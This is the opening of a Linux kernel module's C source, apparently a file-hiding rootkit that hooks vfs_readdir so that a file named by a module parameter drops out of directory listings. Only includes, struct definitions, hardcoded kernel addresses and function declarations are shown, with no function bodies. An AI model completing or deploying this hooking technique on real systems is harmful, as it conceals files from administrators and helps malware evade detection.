#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/stat.h>
#include <linux/file.h>
#include <linux/dirent.h>
#include <linux/vmalloc.h>
#include <linux/uaccess.h>
#include <linux/unistd.h>
#include <linux/fs.h>
#include "HookEngine.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yuhang");

static char *fileToHide = "";
module_param(fileToHide, charp, 0000);
MODULE_PARM_DESC(fileToHide, "Please input filename of the file to be hidden");

static unsigned long long addr_sys_getdents= 0xffffffff8119f0f0;
static unsigned long long addr_vfs_readdir = 0xffffffff8119ef30;

struct linux_dirent {
	unsigned long   d_ino;
	unsigned long   d_off;
	unsigned short  d_reclen;
	char        d_name[];
};

struct getdents_callback {
	struct linux_dirent __user *current_dir;
	struct linux_dirent __user *previous;
	int count;
	int error;
};

/*declare vfs_readdir, this function is exported by kernel*/
int vfs_readdir(struct file *file, filldir_t filler, void *buf);

/*when the fileToHide is first one in the buf, swap that with the next to it*/
static int swap_kern_dirent(struct linux_dirent *dirent, struct linux_dirent *dirent_next);
static int swap_user_dirent(struct linux_dirent __user *dirent, struct linux_dirent __user *dirent_next);

/*compare two string
 *<0 if s1<s2;
 *=0 if s1==s2;
 *>0 if s1>s2;
 * */
static int strCmp(char *s1, char *s2);

/*hook vfs_readir, logic is based on the implemention of syscall 
 *getdents.
 * */
static int hide_file(struct file *file, filldir_t filler, void *buf);

static int __init hideFile_init(void);

static void __exit hideFile_exit(void);

module_init(hideFile_init);
module_exit(hideFile_exit);
